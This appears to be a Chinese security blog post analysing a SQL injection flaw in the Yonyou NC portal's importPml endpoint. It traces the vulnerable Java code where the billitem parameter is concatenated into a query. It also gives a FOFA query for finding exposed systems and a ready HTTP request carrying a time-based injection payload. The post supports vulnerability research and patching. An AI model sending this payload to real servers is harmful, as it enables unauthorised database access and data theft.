---
title: "用友NC portalpage/importPml sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-portalpage-importPml-billitem-sqli.html
asset_dir: assets/用友nc-portalpageimportpml-sql注入漏洞
---

# 用友NC portalpage/importPml sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/27 08:35
* 922浏览
* [0评论](#comment)
* 2小时阅读

深入探索

软件

SQL

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用 /portal/pt/portalpage/importPml接口中的 billitem 参数实现[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，从而窃取服务器的敏感信息。

编程

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看官方漏洞通告

[![用友NC portalpage/importPml sql注入漏洞](images/img-001-5bf9eb24af7e.webp)](https://image.mrxn.net/f787520ff23041009e3b97c5e9358d22.webp)

因此搜索 importPml 方法的实现部分即可定位文件

代码安全审计

nc/uap/portal/action/PortalPageManagerAction.class

```
package nc.uap.portal.action;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.http.HttpServletRequest;
import nc.uap.lfw.core.AppInteractionUtil;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.login.vo.LfwSessionBean;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Param;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.constant.PortalEnv;
import nc.uap.portal.exception.PortalServiceException;
import nc.uap.portal.log.PortalLogger;
import nc.uap.portal.om.Page;
import nc.uap.portal.service.PortalServiceUtil;
import nc.uap.portal.service.itf.IPtPageQryService;
import nc.uap.portal.util.PmlUtil;
import nc.uap.portal.util.PortalPageDataWrap;
import nc.uap.portal.util.PtUtil;
import nc.uap.portal.vo.PtPageVO;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.BusinessException;
import nc.vo.pub.lang.UFBoolean;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.web.multipart.MultipartException;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.multipart.MultipartResolver;
import org.springframework.web.multipart.commons.CommonsMultipartResolver;
import org.xml.sax.SAXException;
import uap.lfw.core.ml.LfwResBundle;
import uap.portal.cache.PageCacheHelper;

@Servlet(
    path = "/portalpage"
)
public class PortalPageManagerAction extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    public PortalPageManagerAction() {
    }

public void importPml() throws IOException {
    MultipartHttpServletRequest req = getMultipartResolver(this.request);
    Map<String, MultipartFile> fileMap = req.getFileMap();
    List<MultipartFile> files = new ArrayList();
    String billitem = req.getParameter("billitem");
    if ("null".equals(billitem)) {
        billitem = "";
    }

    if (MapUtils.isNotEmpty(fileMap)) {
        files.addAll(fileMap.values());
    }

    String name = ((MultipartFile)files.get(0)).getOriginalFilename();
    name = name.replace(".pml", "");
    InputStream in = ((MultipartFile)files.get(0)).getInputStream();

    try {
        Page page = PmlUtil.parser(IOUtils.toString(in, "UTF-8"));
        page.setPagename(name);
        PtPageVO vo = this.pml2vo(page, billitem);
        StringBuffer where = new StringBuffer(" pagename='");
        where.append(name).append("' and module='").append(vo.getModule());
        if (StringUtils.isNotBlank(billitem)) {
            where.append("' and pk_group='").append(billitem).append("' ");
        } else {
            where.append("' and ( pk_group='~' or pk_group='' ) ");
        }

        PtPageVO[] pages = PortalServiceUtil.getPageQryService().getPagesByCondition(where.toString());
        if (pages != null && pages.length > 0) {
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000001"));
            return;
        }

        String pageId = vo.getPagename();
        if (StringUtils.isNumeric(pageId.substring(0, 1))) {
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-0000011"));
            return;
        }

        Pattern p = Pattern.compile("^[a-zA-Z\\d]+$");
        Matcher matcher = p.matcher(pageId);
        if (!matcher.matches()) {
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-0000012"));
            return;
        }

        vo.setUndercontrol(UFBoolean.TRUE);
        PortalServiceUtil.getPageService().add(vo);
        this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000002") + name + NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000003") + LfwResBundle.getInstance().getStrByID("pmng", "PortalPageManagerAction-000008"));
    } catch (Exception e) {
        if (e instanceof SAXException) {
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000004"));
            return;
        }

        this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000005"));
    }

    PageCacheHelper.updatePageCache();
}
```

需要注意：请求体需要是文件上传格式

漏洞修复方案

`billitem` 直接拼接进 `where` 语句中，然后代入 `PortalServiceUtil.getPageQryService().getPagesByCondition` 其实现逻辑如下

```
public PtPageVO[] getPagesByCondition(String condition) throws PortalServiceException {
        PtBaseDAO dao = new PtBaseDAO();

        try {
            List<PtPageVO> vos = (List)dao.retrieveByClause(PtPageVO.class, condition);
            if (vos != null && vos.size() > 0) {
                return (PtPageVO[])vos.toArray(new PtPageVO[0]);
            }
        } catch (DAOException e) {
            PortalLogger.error(e.getMessage(), e);
        }

        return null;
    }
```

将 `where` 语句即 `condition` 又代入 `dao.retrieveByClause` 中，其实现逻辑如下

计算机服务器

```
public Collection retrieveByClause(Class className, String condition) throws DAOException {
    PersistenceManager manager = null;
    Collection values = null;

    try {
        manager = this.createPersistenceManager(this.dataSource);
        values = manager.retrieveByClause(className, condition);
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return values;
}
```

将 `condition` 代入 `createPersistenceManager.retrieveByClause` 中，其实现逻辑如下

```
public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
        BaseProcessor processor = new BeanListProcessor(className);
        return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
    }
```

通过 `buildSql` 组合 `where` 语句 其代码实现逻辑如下

```
private String buildSql(Class className, String condition, String[] fields) {
    SuperVO vo = (SuperVO)this.InitClass(className);
    String pkName = vo.getPKFieldName();
    boolean hasPKField = false;
    StringBuffer buffer = new StringBuffer();
    String tableName = vo.getTableName();
    if (fields == null) {
        buffer.append("SELECT * FROM ").append(tableName);
    } else {
        buffer.append("SELECT ");

        for(int i = 0; i < fields.length; ++i) {
            if (fields[i] != null) {
                buffer.append(fields[i]).append(",");
                if (fields[i].equalsIgnoreCase(pkName)) {
                    hasPKField = true;
                }
            }
        }

        if (!hasPKField) {
            buffer.append(pkName).append(",");
        }

        buffer.setLength(buffer.length() - 1);
        buffer.append(" FROM ").append(tableName);
    }

    if (condition != null && condition.length() != 0) {
        if (condition.toUpperCase().trim().startsWith("ORDER ")) {
            buffer.append(" ").append(condition);
        } else {
            buffer.append(" WHERE ").append(condition);
        }
    }

    return buffer.toString();
}
```

最终直接调用 `session.executeQuery` 执行上面组合后的SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")利用需要注意只能是文件上传格式，需要注意，可参考上面的漏洞分析部分。

编程

```
POST /portal/pt/portalpage/importPml?pageId=login&billitem=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: nc.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="Filedata"; filename="yuantu.jpg"
Content-Type: image/jpeg

<?xml version="1.0" encoding="UTF-8"?>
<page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true" skin="webclassic" level="0"  linkgroup="0000z010000000000002"  ordernum="15">
    <title>系统管理</title>
    <layout id="l1" name="simpleLayout" sizes="100%">
        <layout id="l2" name="paddingLayout" sizes="100%">
            <portlet id="p3" name="pserver:NavigationPortlet" theme="clean" i18nname="admin-00002" title="导航条" column="0" />
            <portlet id="p2" name="AdminMgrContentPortlet" theme="defaultround" i18nname="admin-00003"  title="管理内容" column="0" />
        </layout>
        <layout id="l3" name="simpleLayout" sizes="100%">
            <portlet id="p4" name="pserver:CopyRightPortlet" theme="clean" i18nname="admin-00004"  title="版权" column="0" />
        </layout>
    </layout>
</page>
------123456--
```

[![用友NC portalpage/importPml sql注入漏洞](images/img-002-7bfaeec072ba.webp)](https://image.mrxn.net/31670c360220405985ee56c36415f769.webp)

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=524`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC portalpage/importPml sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-portalpage-importPml-billitem-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-portalpage-importPml-billitem-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

SQL注入检测工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-portalpage-importPml-billitem-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

